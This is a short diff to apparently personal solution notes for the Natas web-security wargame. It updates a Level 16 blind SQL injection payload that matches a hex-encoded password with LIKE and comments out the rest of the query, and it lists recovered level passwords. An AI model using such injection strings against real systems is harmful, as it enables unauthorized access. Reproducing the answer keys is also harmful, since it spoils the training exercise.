@@ -54,6 +54,6 @@
 * AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 #### Level16
-* natas16" and password like "waiheacj63wnnibroheqi3p9t%";-- -
-
+* username=natas16" and hex(password) like "576149484561636a3633776e4e4942524f4865716933703974306d356e686d68%";-- -
+* WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
